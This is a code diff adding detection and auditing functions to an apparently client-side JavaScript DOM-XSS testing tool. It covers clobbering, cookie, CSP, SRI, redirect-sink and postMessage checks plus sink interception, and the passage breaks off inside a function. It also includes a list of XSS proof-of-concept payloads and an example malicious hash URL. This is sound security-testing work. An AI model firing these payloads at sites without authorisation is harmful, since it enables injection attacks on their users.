@@ -4159,6 +4159,935 @@
   window.lookupVulnerability = lookupVulnerability;
   window.vulnerabilityDatabase = vulnerabilityDatabase;
 
+  // ===========================================
+  // ENHANCEMENTS 1-10
+  // ===========================================
+
+  // Enhancement 1: URL Parameter Source Enumeration
+  function enumerateURLParams() {
+    const params = {};
+    const url = new URL(window.location.href);
+    url.searchParams.forEach((value, key) => {
+      params[key] = { value, encoded: encodeURIComponent(value), length: value.length };
+    });
+    // Also parse hash parameters (after ? or & in hash)
+    const hash = window.location.hash.slice(1);
+    if (hash.includes("=")) {
+      const hashParams = new URLSearchParams(hash);
+      hashParams.forEach((value, key) => {
+        params["#" + key] = { value, source: "hash", length: value.length };
+      });
+    }
+    console.log("%c🔍 URL Parameters Found:", "color: #e74c3c; font-weight: bold;");
+    console.table(params);
+    console.log(`Total: ${Object.keys(params).length} parameter(s)`);
+    return params;
+  }
+  window.enumerateURLParams = enumerateURLParams;
+
+  // Enhancement 2: DOM Clobbering Detection
+  function detectDOMClobbering() {
+    const clobberedGlobals = [];
+    const idElements = document.querySelectorAll("[id]");
+    const nameElements = document.querySelectorAll("[name]");
+    const globalNames = new Set(["document", "window", "self", "top", "parent", "frames", "opener", "location", "chrome", "undefined", "NaN", "Infinity", "Array", "Object", "String", "Number", "Boolean", "Function", "RegExp", "Date", "Math", "JSON", "Promise", "Map", "Set", "Symbol", "Error", "console", "navigator", "location", "history", "screen", "performance", "crypto", "fetch", "XMLHttpRequest", "URL", "FormData", "Image", "Event", "MutationObserver", "IntersectionObserver", "ResizeObserver", "Worker", "ServiceWorker", "SharedWorker", "WebSocket", "MessageChannel", "BroadcastChannel", "localStorage", "sessionStorage", "indexedDB", "caches", "cookieStore", "scheduler", "trustedTypes", "crossOriginIsolated", "origin", "isSecureContext", "locationbar", "menubar", "personalbar", "scrollbars", "statusbar", "toolbar", "status", "closed", "external", "length", "name", "customElements", "origin", "addEventListener", "removeEventListener", "dispatchEvent", "postMessage", "close", "stop", "focus", "blur", "open", "alert", "confirm", "prompt", "print", "requestAnimationFrame", "cancelAnimationFrame", "requestIdleCallback", "cancelIdleCallback", "queueMicrotask", "setTimeout", "clearTimeout", "setInterval", "clearInterval", "atob", "btoa", "createImageBitmap", "structuredClone", "fetch", "reportError", "speechSynthesis", "onpointerrawupdate", "crossOriginIsolated", "scheduler", "trustedTypes"]);
+
+    function checkElement(el) {
+      const id = el.id;
+      const name = el.getAttribute("name");
+      const identifier = id || name;
+      if (!identifier) return;
+      // Check if identifier shadows a known global or common config variable
+      const dangerousTags = ["A", "FORM", "IMG", "IFRAME", "OBJECT", "EMBED"];
+      if (dangerousTags.includes(el.tagName) && !identifier.startsWith("_")) {
+        clobberedGlobals.push({
+          identifier,
+          tag: el.tagName,
+          type: id ? "id" : "name",
+          risk: globalNames.has(identifier) ? "CRITICAL" : "MEDIUM",
+          description: globalNames.has(identifier)
+            ? `Shadows global '${identifier}' - direct DOM clobbering vector`
+            : `Potential clobbering of '${identifier}' variable`,
+        });
+      }
+    }
+
+    idElements.forEach(checkElement);
+    nameElements.forEach(checkElement);
+
+    // Deduplicate by identifier
+    const seen = new Set();
+    const unique = clobberedGlobals.filter((item) => {
+      if (seen.has(item.identifier)) return false;
+      seen.add(item.identifier);
+      return true;
+    });
+
+    if (unique.length > 0) {
+      console.log("%c⚠️ DOM Clobbering Vectors Found:", "color: #e74c3c; font-weight: bold;");
+      console.table(unique);
+    } else {
+      console.log("%c✅ No DOM clobbering vectors detected.", "color: #27ae60;");
+    }
+    return unique;
+  }
+  window.detectDOMClobbering = detectDOMClobbering;
+
+  // Enhancement 3: Cookie Security Audit
+  function auditCookies() {
+    const cookies = document.cookie.split(";").map((c) => c.trim()).filter(Boolean);
+    const audit = cookies.map((cookie) => {
+      const [name, ...rest] = cookie.split("=");
+      const value = rest.join("=");
+      return {
+        name: name.trim(),
+        valueLength: value.length,
+        hasValue: value.length > 0,
+        isSensitive: /token|session|auth|jwt|secret|key|pass|cookie/i.test(name.trim()),
+        likelyHttpOnly: false, // Cannot detect from JS - this is informational
+      };
+    });
+
+    console.log("%c🍪 Cookie Security Audit:", "color: #f39c12; font-weight: bold;");
+    console.log(`Total cookies: ${cookies.length}`);
+    console.log("Note: HttpOnly, Secure, SameSite flags cannot be read from JavaScript.");
+    console.log("Use browser DevTools > Application > Cookies for full attribute inspection.");
+    if (audit.some((c) => c.isSensitive)) {
+      console.log("%c⚠️ Sensitive cookie names detected! Verify HttpOnly/Secure flags.", "color: #e74c3c;");
+    }
+    console.table(audit);
+    return audit;
+  }
+  window.auditCookies = auditCookies;
+
+  // Enhancement 4: Subresource Integrity (SRI) Checker
+  function checkSRI() {
+    const scripts = document.querySelectorAll("script[src]");
+    const links = document.querySelectorAll("link[rel='stylesheet'][href]");
+    const results = { missing: [], present: [], total: 0 };
+
+    scripts.forEach((el) => {
+      results.total++;
+      if (el.integrity) {
+        results.present.push({ type: "script", src: el.src, hasIntegrity: true, crossOrigin: el.crossOrigin || "none" });
+      } else {
+        results.missing.push({ type: "script", src: el.src, risk: el.crossOrigin === "anonymous" ? "HIGH" : "MEDIUM" });
+      }
+    });
+
+    links.forEach((el) => {
+      results.total++;
+      if (el.integrity) {
+        results.present.push({ type: "stylesheet", href: el.href, hasIntegrity: true, crossOrigin: el.crossOrigin || "none" });
+      } else {
+        results.missing.push({ type: "stylesheet", href: el.href, risk: "MEDIUM" });
+      }
+    });
+
+    console.log("%c🔒 Subresource Integrity (SRI) Check:", "color: #3498db; font-weight: bold;");
+    console.log(`Total resources: ${results.total}, With SRI: ${results.present.length}, Missing SRI: ${results.missing.length}`);
+    if (results.missing.length > 0) {
+      console.log("%c⚠️ Resources missing SRI:", "color: #e74c3c;");
+      console.table(results.missing);
+    } else {
+      console.log("%c✅ All external resources have SRI.", "color: #27ae60;");
+    }
+    return results;
+  }
+  window.checkSRI = checkSRI;
+
+  // Enhancement 5: Open Redirect Sink Detection
+  function detectOpenRedirectSinks() {
+    const sinks = [];
+    // Check forms with dynamic action attributes
+    document.querySelectorAll("form[action]").forEach((form) => {
+      const action = form.getAttribute("action");
+      if (action && (action.includes("http") || action.includes("//") || action.includes("url") || action.includes("redirect") || action.includes("return") || action.includes("next") || action.includes("go"))) {
+        sinks.push({ type: "form-action", value: action, risk: "HIGH" });
+      }
+    });
+    // Check meta refresh tags
+    document.querySelectorAll('meta[http-equiv="refresh"]').forEach((meta) => {
+      const content = meta.getAttribute("content");
+      if (content && content.includes("url")) {
+        sinks.push({ type: "meta-refresh", value: content, risk: "HIGH" });
+      }
+    });
+    // Check links with redirect-like patterns
+    document.querySelectorAll("a[href]").forEach((a) => {
+      const href = a.getAttribute("href");
+      if (href && (href.includes("redirect") || href.includes("return_url") || href.includes("next=") || href.includes("continue=") || href.includes("redir"))) {
+        sinks.push({ type: "link-href", value: href, risk: "MEDIUM" });
+      }
+    });
+
+    console.log("%c🔄 Open Redirect Sinks:", "color: #f39c12; font-weight: bold;");
+    if (sinks.length > 0) {
+      console.table(sinks);
+    } else {
+      console.log("%c✅ No obvious open redirect sinks found.", "color: #27ae60;");
+    }
+    return sinks;
+  }
+  window.detectOpenRedirectSinks = detectOpenRedirectSinks;
+
+  // Enhancement 6: CSS Exfiltration Detection
+  function detectCSSExfiltration() {
+    const risks = [];
+    // Check for style attributes with url() or expression()
+    document.querySelectorAll("[style]").forEach((el) => {
+      const style = el.getAttribute("style");
+      if (style && (style.includes("url(") || style.includes("expression(") || style.includes("behavior:") || style.includes("-moz-binding"))) {
+        risks.push({ tag: el.tagName, id: el.id, style: style.substring(0, 100), risk: "HIGH" });
+      }
+    });
+    // Check for <style> tags with url() containing user-controllable data patterns
+    document.querySelectorAll("style").forEach((style) => {
+      const text = style.textContent;
+      if (text && text.includes("url(") && (text.includes("attr(") || text.includes("var("))) {
+        risks.push({ tag: "STYLE", pattern: "url() with attr()/var()", risk: "MEDIUM" });
+      }
+    });
+    // Check for link[rel="stylesheet"] with @import
+    document.querySelectorAll("link[rel='stylesheet']").forEach((link) => {
+      risks.push({ tag: "LINK", href: link.href, note: "External CSS - check for @import and url() exfiltration", risk: "INFO" });
+    });
+
+    console.log("%c🎨 CSS Exfiltration Vectors:", "color: #9b59b6; font-weight: bold;");
+    if (risks.length > 0) {
+      console.table(risks);
+    } else {
+      console.log("%c✅ No obvious CSS exfiltration vectors found.", "color: #27ae60;");
+    }
+    return risks;
+  }
+  window.detectCSSExfiltration = detectCSSExfiltration;
+
+  // Enhancement 7: JavaScript Framework/Library Detection
+  function detectFrameworks() {
+    const detected = [];
+    const checks = [
+      { name: "React", test: () => !!window.__REACT_DEVTOOLS_GLOBAL_HOOK__ || !!document.querySelector("[data-reactroot]") || !!window.React },
+      { name: "Vue.js", test: () => !!window.__VUE__ || !!window.Vue || !!document.querySelector("[data-v-]") },
+      { name: "Angular", test: () => !!window.ng || !!document.querySelector("[ng-version]") || !!document.querySelector("[ng-app]") },
+      { name: "jQuery", test: () => !!window.jQuery || !!window.$ },
+      { name: "Lodash", test: () => !!window._ && !!window._.VERSION },
+      { name: "moment.js", test: () => !!window.moment },
+      { name: "Next.js", test: () => !!window.__NEXT_DATA__ || !!document.querySelector("#__next") },
+      { name: "Nuxt.js", test: () => !!window.__NUXT__ || !!document.querySelector("#__nuxt") },
+      { name: "Ember.js", test: () => !!window.Ember },
+      { name: "Backbone.js", test: () => !!window.Backbone },
+      { name: "Svelte", test: () => !!document.querySelector("[class*='svelte-']") },
+      { name: "jQuery UI", test: () => !!window.jQuery && !!window.jQuery.ui },
+      { name: "Bootstrap", test: () => !!document.querySelector(".modal") || !!document.querySelector("[data-bs-toggle]") },
+      { name: "Tailwind CSS", test: () => !!document.querySelector("[class*='tw-']") || !!document.querySelector("script[src*='tailwind']") },
+      { name: "GSAP", test: () => !!window.gsap },
+      { name: "D3.js", test: () => !!window.d3 },
+      { name: "Three.js", test: () => !!window.THREE },
+      { name: "Webpack", test: () => !!window.webpackJsonp || !!window.__webpack_require__ },
+      { name: "Vite", test: () => !!document.querySelector("script[type='module'][src*='@vite']") },
+      { name: "Google Analytics", test: () => !!window.ga || !!window.gtag || !!window._gaq },
+      { name: "Google Tag Manager", test: () => !!window.dataLayer },
+      { name: "Segment", test: () => !!window.analytics && !!window.analytics.track },
+      { name: "Firebase", test: () => !!window.firebase || !!window.firebaseApp },
+    ];
+
+    checks.forEach(({ name, test }) => {
+      try {
+        if (test()) detected.push({ name, detected: true });
+      } catch (e) {}
+    });
+
+    console.log("%c🛠️ Framework/Library Detection:", "color: #3498db; font-weight: bold;");
+    if (detected.length > 0) {
+      console.table(detected);
+      console.log("Note: Framework-specific sinks may apply. Check the sink catalog for framework-specific attack vectors.");
+    } else {
+      console.log("%cNo known frameworks detected.", "color: #7f8c8d;");
+    }
+    return detected;
+  }
+  window.detectFrameworks = detectFrameworks;
+
+  // Enhancement 8: Contenteditable & Rich Text Editor Detection
+  function detectContentEditable() {
+    const editables = [];
+    document.querySelectorAll("[contenteditable='true'], [contenteditable='']").forEach((el) => {
+      editables.push({
+        tag: el.tagName,
+        id: el.id || "none",
+        className: el.className || "none",
+        hasInnerHtml: el.innerHTML.length > 0,
+        risk: "HIGH - Rich text input can inject HTML/scripts",
+      });
+    });
+    // Check for common rich text editors
+    const editorChecks = [
+      { name: "TinyMCE", test: () => !!window.tinymce || !!document.querySelector(".mce-content-body") },
+      { name: "CKEditor", test: () => !!window.CKEDITOR || !!document.querySelector(".cke_editor") },
+      { name: "Quill", test: () => !!window.Quill || !!document.querySelector(".ql-editor") },
+      { name: "ProseMirror", test: () => !!document.querySelector(".ProseMirror") },
+      { name: "Slate", test: () => !!document.querySelector("[data-slate-editor]") },
+      { name: "Summernote", test: () => !!window.jQuery && !!window.jQuery.fn.summernote },
+      { name: "Froala", test: () => !!window.FroalaEditor || !!document.querySelector(".fr-element") },
+      { name: "Draft.js", test: () => !!document.querySelector("[data-editor]") },
+    ];
+
+    const editors = editorChecks.filter(({ test }) => { try { return test(); } catch (e) { return false; } });
+
+    console.log("%c📝 Contenteditable & Rich Text Editors:", "color: #e67e22; font-weight: bold;");
+    if (editables.length > 0) {
+      console.log(`Found ${editables.length} contenteditable element(s):`);
+      console.table(editables);
+    }
+    if (editors.length > 0) {
+      console.log("%c⚠️ Rich text editors detected - test for XSS via pasted HTML:", "color: #e74c3c;");
+      console.table(editors.map((e) => e.name));
+    }
+    if (editables.length === 0 && editors.length === 0) {
+      console.log("%cNo contenteditable elements or rich text editors found.", "color: #7f8c8d;");
+    }
+    return { editables, editors };
+  }
+  window.detectContentEditable = detectContentEditable;
+
+  // Enhancement 9: HTTP Security Header Recommendations
+  function recommendSecurityHeaders() {
+    const recommendations = [
+      { header: "Content-Security-Policy", purpose: "Prevents XSS, data injection", check: () => !!document.querySelector('meta[http-equiv="Content-Security-Policy"]') },
+      { header: "X-Content-Type-Options", purpose: "Prevents MIME sniffing", check: () => false, note: "Cannot read HTTP headers from JS - check via DevTools Network tab" },
+      { header: "X-Frame-Options", purpose: "Prevents clickjacking", check: () => false, note: "Cannot read HTTP headers from JS" },
+      { header: "Strict-Transport-Security", purpose: "Enforces HTTPS", check: () => location.protocol === "https:" },
+      { header: "X-XSS-Protection", purpose: "Legacy XSS filter (deprecated)", check: () => false, note: "Cannot read HTTP headers from JS" },
+      { header: "Referrer-Policy", purpose: "Controls referrer leakage", check: () => false, note: "Cannot read HTTP headers from JS" },
+      { header: "Permissions-Policy", purpose: "Controls feature access", check: () => false, note: "Cannot read HTTP headers from JS" },
+      { header: "Cross-Origin-Embedder-Policy", purpose: "Enables cross-origin isolation", check: () => window.crossOriginIsolated },
+      { header: "Cross-Origin-Opener-Policy", purpose: "Isolates browsing context", check: () => false, note: "Cannot read HTTP headers from JS" },
+      { header: "Cross-Origin-Resource-Policy", purpose: "Controls cross-origin loading", check: () => false, note: "Cannot read HTTP headers from JS" },
+    ];
+
+    console.log("%c🔐 Security Header Recommendations:", "color: #2ecc71; font-weight: bold;");
+    console.log("Most security headers are HTTP-only and cannot be read from JavaScript.");
+    console.log("Use browser DevTools Network tab or tools like securityheaders.com to check.");
+    console.table(recommendations.map((r) => ({ Header: r.header, Purpose: r.purpose, "Can Check From JS": r.check() ? "✅ Yes" : "❌ No", Note: r.note || "" })));
+    return recommendations;
+  }
+  window.recommendSecurityHeaders = recommendSecurityHeaders;
+
+  // Enhancement 10: Improved CSP Analysis with frame-ancestors
+  function analyzeCSPDetailed() {
+    const cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
+    const cspContent = cspMeta?.getAttribute("content");
+    const result = {
+      hasCSP: !!cspContent,
+      source: cspContent ? "meta-tag" : "none (check HTTP headers)",
+      directives: {},
+      weaknesses: [],
+      riskLevel: "UNKNOWN",
+    };
+
+    if (cspContent) {
+      const directives = cspContent.split(";").map((d) => d.trim()).filter(Boolean);
+      directives.forEach((dir) => {
+        const [name, ...values] = dir.split(/\s+/);
+        result.directives[name.toLowerCase()] = values.join(" ");
+      });
+
+      // Analyze weaknesses
+      const scriptSrc = result.directives["script-src"] || "";
+      const styleSrc = result.directives["style-src"] || "";
+      const frameSrc = result.directives["frame-src"] || "";
+      const frameAncestors = result.directives["frame-ancestors"] || "";
+      const objectSrc = result.directives["object-src"] || "";
+
+      if (scriptSrc.includes("'unsafe-inline'")) result.weaknesses.push("script-src allows unsafe-inline - XSS possible");
+      if (scriptSrc.includes("'unsafe-eval'")) result.weaknesses.push("script-src allows unsafe-eval - eval-based XSS possible");
+      if (scriptSrc.includes("*")) result.weaknesses.push("script-src has wildcard - loads scripts from any origin");
+      if (!result.directives["script-src"] && !result.directives["default-src"]) result.weaknesses.push("No script-src or default-src directive");
+      if (styleSrc.includes("'unsafe-inline'")) result.weaknesses.push("style-src allows unsafe-inline - CSS injection possible");
+      if (!frameAncestors && !result.directives["frame-ancestors"]) result.weaknesses.push("Missing frame-ancestors - page can be framed (clickjacking)");
+      if (frameAncestors === "*") result.weaknesses.push("frame-ancestors is wildcard - page can be framed by any origin");
+      if (!objectSrc || objectSrc === "*") result.weaknesses.push("object-src not restricted - plugin-based attacks possible");
+      if (!frameSrc && !result.directives["default-src"]) result.weaknesses.push("No frame-src - defaults to unrestricted frame loading");
+
+      // Calculate risk
+      const criticalCount = result.weaknesses.filter((w) => w.includes("unsafe-eval") || w.includes("wildcard")).length;
+      const highCount = result.weaknesses.filter((w) => w.includes("unsafe-inline") || w.includes("No script-src")).length;
+      if (criticalCount > 0) result.riskLevel = "CRITICAL";
+      else if (highCount > 0) result.riskLevel = "HIGH";
+      else if (result.weaknesses.length > 0) result.riskLevel = "MEDIUM";
+      else result.riskLevel = "LOW";
+    } else {
+      result.riskLevel = "CRITICAL";
+      result.weaknesses.push("No CSP detected via meta tag - check HTTP headers");
+    }
+
+    console.log("%c🛡️ Detailed CSP Analysis:", "color: #e74c3c; font-weight: bold;");
+    console.log(`CSP Present: ${result.hasCSP ? "Yes" : "No"}`);
+    console.log(`Risk Level: ${result.riskLevel}`);
+    if (result.weaknesses.length > 0) {
+      console.log("%cWeaknesses:", "color: #f39c12;");
+      result.weaknesses.forEach((w) => console.log(`  ⚠️ ${w}`));
+    }
+    if (Object.keys(result.directives).length > 0) {
+      console.log("%cDirectives:", "color: #3498db;");
+      console.table(result.directives);
+    }
+    return result;
+  }
+  window.analyzeCSPDetailed = analyzeCSPDetailed;
+
+  // ===========================================
+  // NEW FEATURES 1-10
+  // ===========================================
+
+  // New Feature 1: Real-Time Sink Interception via Monkey-Patching
+  const _interceptedCalls = [];
+  let _interceptionActive = false;
+  const _originals = {};
+
+  function startSinkInterception() {
+    if (_interceptionActive) { console.log("Interception already active."); return; }
+    _interceptionActive = true;
+
+    // Intercept eval
+    _originals.eval = window.eval;
+    window.eval = function (...args) {
+      const call = { sink: "eval", args: args.map(String).join(", "), stack: new Error().stack, timestamp: Date.now() };
+      _interceptedCalls.push(call);
+      console.log("%c🔴 INTERCEPTED: eval(" + args.map(String).join(", ") + ")", "color: #e74c3c; font-weight: bold;");
+      console.trace("eval call stack");
+      return _originals.eval.apply(this, args);
+    };
+
+    // Intercept setTimeout with string arg
+    _originals.setTimeout = window.setTimeout;
+    window.setTimeout = function (fn, ...args) {
+      if (typeof fn === "string") {
+        const call = { sink: "setTimeout(string)", args: fn, stack: new Error().stack, timestamp: Date.now() };
+        _interceptedCalls.push(call);
+        console.log("%c🔴 INTERCEPTED: setTimeout(\"" + fn.substring(0, 100) + "\")", "color: #e74c3c; font-weight: bold;");
+      }
+      return _originals.setTimeout.call(this, fn, ...args);
+    };
+
+    // Intercept setInterval with string arg
+    _originals.setInterval = window.setInterval;
+    window.setInterval = function (fn, ...args) {
+      if (typeof fn === "string") {
+        const call = { sink: "setInterval(string)", args: fn, stack: new Error().stack, timestamp: Date.now() };
+        _interceptedCalls.push(call);
+        console.log("%c🔴 INTERCEPTED: setInterval(\"" + fn.substring(0, 100) + "\")", "color: #e74c3c; font-weight: bold;");
+      }
+      return _originals.setInterval.call(this, fn, ...args);
+    };
+
+    // Intercept Function constructor
+    _originals.Function = window.Function;
+    window.Function = function (...args) {
+      const call = { sink: "Function()", args: args.map(String).join(", "), stack: new Error().stack, timestamp: Date.now() };
+      _interceptedCalls.push(call);
+      console.log("%c🔴 INTERCEPTED: Function(" + args.map(String).join(", ") + ")", "color: #e74c3c; font-weight: bold;");
+      console.trace("Function constructor call stack");
+      return _originals.Function.apply(this, args);
+    };
+    window.Function.prototype = _originals.Function.prototype;
+
+    // Intercept document.write
+    _originals.documentWrite = document.write.bind(document);
+    document.write = function (...args) {
+      const call = { sink: "document.write", args: args.join("").substring(0, 200), stack: new Error().stack, timestamp: Date.now() };
+      _interceptedCalls.push(call);
+      console.log("%c🔴 INTERCEPTED: document.write(" + args.join("").substring(0, 100) + ")", "color: #e74c3c; font-weight: bold;");
+      return _originals.documentWrite(...args);
+    };
+
+    // Intercept innerHTML setter
+    _originals.innerHTMLDescriptor = Object.getOwnPropertyDescriptor(Element.prototype, "innerHTML");
+    const origSet = _originals.innerHTMLDescriptor.set;
+    Object.defineProperty(Element.prototype, "innerHTML", {
+      get: _originals.innerHTMLDescriptor.get,
+      set: function (value) {
+        if (typeof value === "string" && (value.includes("<") || value.includes("script"))) {
+          const call = { sink: "innerHTML", element: this.tagName + "#" + (this.id || ""), value: value.substring(0, 200), stack: new Error().stack, timestamp: Date.now() };
+          _interceptedCalls.push(call);
+          console.log("%c🔴 INTERCEPTED: innerHTML on " + this.tagName + "#" + (this.id || ""), "color: #e74c3c; font-weight: bold;");
+        }
+        return origSet.call(this, value);
+      },
+      configurable: true,
+    });
+
+    console.log("%c🛡️ Sink Interception ACTIVE - Monitoring eval, setTimeout(string), Function(), document.write, innerHTML", "color: #27ae60; font-weight: bold;");
+    console.log("Call window.stopSinkInterception() to stop and view results.");
+  }
+  window.startSinkInterception = startSinkInterception;
+
+  function stopSinkInterception() {
+    if (!_interceptionActive) { console.log("Interception not active."); return; }
+    _interceptionActive = false;
+    if (_originals.eval) window.eval = _originals.eval;
+    if (_originals.setTimeout) window.setTimeout = _originals.setTimeout;
+    if (_originals.setInterval) window.setInterval = _originals.setInterval;
+    if (_originals.Function) window.Function = _originals.Function;
+    if (_originals.documentWrite) document.write = _originals.documentWrite;
+    if (_originals.innerHTMLDescriptor) Object.defineProperty(Element.prototype, "innerHTML", _originals.innerHTMLDescriptor);
+
+    console.log("%c🛑 Sink Interception STOPPED", "color: #f39c12; font-weight: bold;");
+    console.log(`Total intercepted calls: ${_interceptedCalls.length}`);
+    if (_interceptedCalls.length > 0) {
+      console.table(_interceptedCalls.map((c) => ({ sink: c.sink, args: (c.args || "").substring(0, 80), element: c.element || "" })));
+    }
+    return _interceptedCalls;
+  }
+  window.stopSinkInterception = stopSinkInterception;
+
+  function getInterceptedCalls() { return [..._interceptedCalls]; }
+  window.getInterceptedCalls = getInterceptedCalls;
+
+  // New Feature 2: URL Parameter Taint Tracking
+  function trackURLParameterTaint() {
+    const params = new URLSearchParams(window.location.search);
+    const hash = window.location.hash.slice(1);
+    const results = [];
+
+    params.forEach((value, key) => {
+      if (!value) return;
+      // Check if parameter value appears anywhere in the DOM
+      const searchTargets = [
+        { location: "body.textContent", found: document.body.textContent.includes(value) },
+        { location: "body.innerHTML", found: document.body.innerHTML && document.body.innerHTML.includes(value) },
+        { location: "URL search", found: window.location.search.includes(value) },
+        { location: "URL hash", found: window.location.hash.includes(value) },
+      ];
+
+      // Check all elements for the value
+      document.querySelectorAll("*").forEach((el) => {
+        if (el.textContent && el.textContent.includes(value)) {
+          searchTargets.push({ location: `${el.tagName}#${el.id || ""} textContent`, found: true });
+        }
+        if (el.innerHTML && el.innerHTML.includes(value)) {
+          searchTargets.push({ location: `${el.tagName}#${el.id || ""} innerHTML`, found: true });
+        }
+      });
+
+      const foundIn = searchTargets.filter((t) => t.found);
+      results.push({
+        param: key,
+        value: value.substring(0, 50),
+        taintedLocations: foundIn.map((f) => f.location),
+        risk: foundIn.some((f) => f.location.includes("innerHTML")) ? "HIGH" : foundIn.length > 0 ? "MEDIUM" : "LOW",
+      });
+    });
+
+    console.log("%c🔍 URL Parameter Taint Tracking:", "color: #e74c3c; font-weight: bold;");
+    if (results.length > 0) {
+      console.table(results);
+      const highRisk = results.filter((r) => r.risk === "HIGH");
+      if (highRisk.length > 0) {
+        console.log("%c⚠️ HIGH RISK: Parameters found in innerHTML - potential DOM XSS!", "color: #e74c3c; font-weight: bold;");
+      }
+    } else {
+      console.log("%cNo URL parameters with values found.", "color: #7f8c8d;");
+    }
+    return results;
+  }
+  window.trackURLParameterTaint = trackURLParameterTaint;
+
+  // New Feature 3: Hash Fragment XSS Testing
+  function testHashFragmentXSS() {
+    const hash = window.location.hash;
+    if (!hash || hash.length < 2) {
+      console.log("%cNo hash fragment found. Try adding a hash to the URL first.", "color: #7f8c8d;");
+      console.log("Example: " + window.location.href + "#<img src=x onerror=alert(1)>");
+      return [];
+    }
+
+    const results = [];
+    const hashContent = hash.slice(1);
+
+    // Check if hash content appears in DOM
+    const allElements = document.querySelectorAll("*");
+    allElements.forEach((el) => {
+      if (el.textContent && el.textContent.includes(hashContent)) {
+        results.push({ element: el.tagName + "#" + (el.id || ""), location: "textContent", risk: "MEDIUM" });
+      }
+      if (el.innerHTML && el.innerHTML.includes(hashContent)) {
+        results.push({ element: el.tagName + "#" + (el.id || ""), location: "innerHTML", risk: "CRITICAL" });
+      }
+      // Check attributes
+      for (const attr of el.attributes) {
+        if (attr.value && attr.value.includes(hashContent)) {
+          results.push({ element: el.tagName + "#" + (el.id || ""), location: `attribute:${attr.name}`, risk: ["href", "src", "action"].includes(attr.name) ? "HIGH" : "MEDIUM" });
+        }
+      }
+    });
+
+    console.log("%c🔗 Hash Fragment XSS Analysis:", "color: #e74c3c; font-weight: bold;");
+    console.log(`Hash content: "${hashContent.substring(0, 100)}"`);
+    if (results.length > 0) {
+      console.table(results);
+      if (results.some((r) => r.risk === "CRITICAL")) {
+        console.log("%c🚨 CRITICAL: Hash content found in innerHTML - immediate XSS risk!", "color: #e74c3c; font-weight: bold;");
+      }
+    } else {
+      console.log("%cHash content not found reflected in DOM.", "color: #27ae60;");
+    }
+    return results;
+  }
+  window.testHashFragmentXSS = testHashFragmentXSS;
+
+  // New Feature 4: PostMessage Handler Origin Auditing
+  function auditPostMessageHandlers() {
+    const results = [];
+    // Check for message event listeners by hooking addEventListener
+    const origAddEventListener = EventTarget.prototype.addEventListener;
+    const messageListeners = [];
+
+    // We can't retroactively find existing listeners, but we can document the pattern
+    // and check for common anti-patterns in the page's scripts
+
+    // Check for postMessage usage in script sources
+    document.querySelectorAll("script").forEach((script) => {
+      if (script.src) {
+        results.push({ type: "external-script", src: script.src, note: "Fetch and search for addEventListener('message', ...) patterns" });
+      }
+    });
+
+    // Check for common postMessage patterns in inline scripts
+    document.querySelectorAll("script:not([src])").forEach((script) => {
+      const code = script.textContent;
+      if (code.includes("postMessage") || code.includes("addEventListener") && code.includes("message")) {
+        const hasOriginCheck = code.includes("event.origin") || code.includes("e.origin") || code.includes("msg.origin") || code.includes(".origin ===");
+        const hasSourceCheck = code.includes("event.source") || code.includes("e.source") || code.includes("msg.source") || code.includes(".source ===");
+        results.push({
+          type: "inline-script",
+          hasOriginCheck,
+          hasSourceCheck,
+          risk: !hasOriginCheck ? "HIGH" : "LOW",
+          note: !hasOriginCheck ? "Missing origin validation in message handler" : "Origin validation detected",
+        });
+      }
+    });
+
+    console.log("%c📨 PostMessage Handler Audit:", "color: #3498db; font-weight: bold;");
+    if (results.length > 0) {
+      console.table(results);
+    } else {
+      console.log("%cNo postMessage handlers detected in inline scripts.", "color: #7f8c8d;");
+    }
+    console.log("Tip: Use browser DevTools to check event listeners on window for 'message' events.");
+    return results;
+  }
+  window.auditPostMessageHandlers = auditPostMessageHandlers;
+
+  // New Feature 5: Storage-to-Sink Chain Detection
+  function detectStorageToSinkChains() {
+    const chains = [];
+    const storageKeys = [];
+
+    // Collect all storage keys
+    try {
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        const value = localStorage.getItem(key);
+        storageKeys.push({ storage: "localStorage", key, valueLength: value ? value.length : 0, preview: value ? value.substring(0, 100) : "" });
+      }
+    } catch (e) {}
+    try {
+      for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        const value = sessionStorage.getItem(key);
+        storageKeys.push({ storage: "sessionStorage", key, valueLength: value ? value.length : 0, preview: value ? value.substring(0, 100) : "" });
+      }
+    } catch (e) {}
+
+    // Check if any storage values appear in DOM sinks
+    storageKeys.forEach(({ storage, key, preview }) => {
+      if (!preview) return;
+      document.querySelectorAll("*").forEach((el) => {
+        if (el.innerHTML && el.innerHTML.includes(preview)) {
+          chains.push({ storage, key, sink: `innerHTML on ${el.tagName}#${el.id || ""}`, risk: "CRITICAL" });
+        }
+      });
+    });
+
+    console.log("%c💾 Storage-to-Sink Chain Detection:", "color: #9b59b6; font-weight: bold;");
+    console.log(`Storage entries found: ${storageKeys.length}`);
+    if (storageKeys.length > 0) {
+      console.log("%cStorage keys:", "color: #3498db;");
+      console.table(storageKeys);
+    }
+    if (chains.length > 0) {
+      console.log("%c⚠️ CRITICAL: Storage values found in DOM sinks!", "color: #e74c3c; font-weight: bold;");
+      console.table(chains);
+    } else {
+      console.log("%cNo direct storage-to-sink chains detected.", "color: #27ae60;");
+    }
+    return { storageKeys, chains };
+  }
+  window.detectStorageToSinkChains = detectStorageToSinkChains;
+
+  // New Feature 6: Automatic PoC Payload Generator
+  function generatePoC(source, sink, context) {
+    const payloads = [];
+    const sourceType = (source || "url").toLowerCase();
+    const sinkType = (sink || "innerHTML").toLowerCase();
+
+    if (sinkType.includes("innerhtml") || sinkType.includes("outerhtml") || sinkType.includes("document.write")) {
+      payloads.push({ payload: '<img src=x onerror=alert(1)>', description: "Basic script execution via image error" });
+      payloads.push({ payload: '<svg onload=alert(1)>', description: "SVG onload execution" });
+      payloads.push({ payload: '<iframe src="javascript:alert(1)">', description: "Iframe javascript: protocol" });
+      payloads.push({ payload: '<details open ontoggle=alert(1)>', description: "HTML5 event handler" });
+      payloads.push({ payload: '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>', description: "Mutation XSS (mXSS) vector" });
+    }
+    if (sinkType.includes("eval") || sinkType.includes("function")) {
+      payloads.push({ payload: "alert(1)", description: "Basic eval payload" });
+      payloads.push({ payload: "1,alert(1)", description: "Comma operator bypass" });
+      payloads.push({ payload: "typeof this.alert", description: "Type probe" });
+    }
+    if (sinkType.includes("location") || sinkType.includes("href") || sinkType.includes("url")) {
